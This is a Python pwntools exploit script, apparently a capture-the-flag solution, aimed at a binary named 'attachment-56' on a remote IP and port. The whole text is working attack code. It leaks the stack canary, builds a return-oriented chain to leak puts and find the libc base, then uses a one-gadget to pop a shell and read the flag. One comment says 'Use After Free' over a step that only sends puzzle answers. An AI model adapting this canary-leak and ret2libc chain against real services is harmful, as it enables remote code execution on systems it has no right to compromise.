from pwn import *
import sys, os

context.arch = "amd64"
log.level = "info"
elf = ELF("./attachment-56")
p= remote("39.96.193.120", 10001)
POP_RDI = 0x401763
MAIN = 0x4015c6

def bypass_puzzle1(p):
    p.recvuntil(b"note:")
    p.sendline(b"100")
    p.recvuntil(b"rune sheet!")
    p.sendline(b"magic")

def leak_canary(p):
    p.send(b"A" * 24 + b"X")
    p.recvuntil(b"X")
    return b"\x00" + p.recv(7)

# 1. Use After Free -> set key=2026
bypass_puzzle1(p)
# 2. Canary leak
p.recvuntil(b"sacrifice?")
canary = leak_canary(p)
# 3. Leak puts addr -> calc libc base
pay1 = b"A" * 24 + canary + b"B" * 8
pay1 += p64(POP_RDI) + p64(elf.got["puts"])
pay1 += p64(elf.plt["puts"]) + p64(MAIN)
p.send(pay1.ljust(0x100, b"\x00"))
p.recvuntil(b"warmth.\n")
puts_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = puts_addr - 0x6f6a0

# 4. One gadget shell
p.recvuntil(b"sacrifice?")
canary2 = leak_canary(p)
og = libc_base + 0x4527a
pay2 = b"A" * 24 + canary2 + b"B" * 8 + p64(og)
p.send(pay2.ljust(0x100, b"\x00"))
p.recvuntil(b"warmth.\n")

p.sendline(b"cat /flag*")
print(p.recv(timeout=3).decode(errors="replace"))
p.close()
